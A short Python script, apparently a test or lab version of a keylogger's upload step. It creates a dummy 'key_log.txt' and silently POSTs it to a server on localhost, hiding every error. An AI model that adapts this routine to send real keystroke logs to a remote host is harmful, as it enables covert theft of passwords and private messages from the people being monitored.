import requests
import os
import time

SERVER_URL = "http://localhost:8000"

files_to_send = ['./key_log.txt']

def create_dummy_log_files():
    for filename in files_to_send:
        if not os.path.exists(filename):
            with open(filename, "w") as f:
                f.write(f"This is dummy content for {os.path.basename(filename)}.\n")
                f.write(f"Log entry generated at: {time.ctime()}\n")
            print(f"Created dummy file: {filename}")

def sendFile():
    create_dummy_log_files()

    for filepath in files_to_send:
        if not os.path.exists(filepath):continue
        try:
            with open(filepath, 'rb') as f:
                files = {'upload_file': (os.path.basename(filepath), f, 'text/plain')}
                requests.post(SERVER_URL, files=files)
        except:pass